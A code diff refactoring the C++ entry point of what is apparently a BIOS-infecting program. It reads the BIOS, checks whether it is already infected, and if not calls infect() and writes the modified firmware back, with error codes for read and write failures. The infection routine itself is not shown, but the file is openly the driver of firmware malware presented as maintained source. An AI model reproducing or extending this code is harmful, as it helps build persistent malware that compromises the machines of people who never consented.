@@ -1,26 +1,33 @@
-#include "exceptions/BiosNotReadableException.h"
-#include "exceptions/BiosNotWriteableException.h"
-#include "exceptions/Exception.h"
-#include "Bios.h"
+#include "Bios.hpp"
+#include "exceptions/BiosNotReadableException.hpp"
+#include "exceptions/BiosNotWriteableException.hpp"
+#include "logs/LogLevel.hpp"
 
-using namespace std;
+const int ERROR_CODE_OK = 0;
+const int ERROR_CODE_BIOS_NOT_READABLE = -1;
+const int ERROR_CODE_BIOS_NOT_WRITEABLE = -2;
 
 int main() {
-	Log * log = new Log();
+	int returnValue = ERROR_CODE_OK;
+	Log log = Log();
+	Bios bios(&log);
+
 	try {
-		Bios bios(log);
 		bios.read();
 		if(!bios.isInfected()) {
 			bios.infect();
 			bios.write();
 		}
-	} catch (BiosNotReadableException & e) {
-		log->printException(e);
-		return -1;
-	} catch (BiosNotWriteableException & e) {
-		log->printException(e);
-		return -2;
+	} catch (BiosNotReadableException& e) {
+		log.printException(INFO, e);
+		returnValue = ERROR_CODE_BIOS_NOT_READABLE;
+		goto exit;
+	} catch (BiosNotWriteableException& e) {
+		log.printException(INFO, e);
+		returnValue = ERROR_CODE_BIOS_NOT_WRITEABLE;
+		goto exit;
 	}
-	delete log;
-	return 0;
+
+	exit:
+	return returnValue;
 }
